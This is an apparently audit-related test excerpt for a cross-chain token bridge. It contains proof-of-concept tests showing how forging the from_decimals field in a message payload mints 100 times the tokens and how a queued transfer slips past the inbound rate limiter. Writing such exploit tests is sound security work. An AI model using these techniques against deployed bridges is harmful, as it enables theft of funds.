    ...
    test("attacker mints 100x tokens by falsifying from_decimals in VAA payload", async () => {
      ...
      const messageReceived = getMessageReceived(
        ...
        getRandomMessageToSend({
          ...
          destinationChainId: Number(SOURCE_CHAIN_ID),
          handlerAddress: convertNumberToBytes(appId, 32),
          payload: getNttPayload(malicious_from_decimals, amount, getRandomBytes(32), user.publicKey, SOURCE_CHAIN_ID),
        }),
      );
      const messageDigest = calculateMessageDigest(messageReceived);
      await transceiverManagerClient.send.setMessageDigest({ args: [messageDigest] });
      ...
      const expected_minted = amount * (10n ** BigInt(DECIMALS - malicious_from_decimals));

      expect(expected_minted).toEqual(1_000_000n);
      expect(res.confirmations[1].innerTxns![0].logs![0]).toEqual(
        getEventBytes("Minted(address,uint64)", [user.toString(), expected_minted]),
      );
    });
  });

  describe("V-008: Rate Limiter Bypass Exploit (C5-REAL Strike)", () => {
    test("attacker completes a massive queued transfer without consuming capacity", async () => {
      const inboundBucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const untrimmedAmount = INBOUND_LIMIT * 10n;
      const amount = untrimmedAmount / 10_000n;

      const initialCapacity = await client.getCurrentInboundCapacity({ args: [PEER_CHAIN_ID] });
      expect(initialCapacity).toEqual(INBOUND_LIMIT);
      ...
      const capacityAfter = await client.getCurrentInboundCapacity({ args: [PEER_CHAIN_ID] });
      expect(capacityAfter).toEqual(INBOUND_LIMIT);
    });
  });
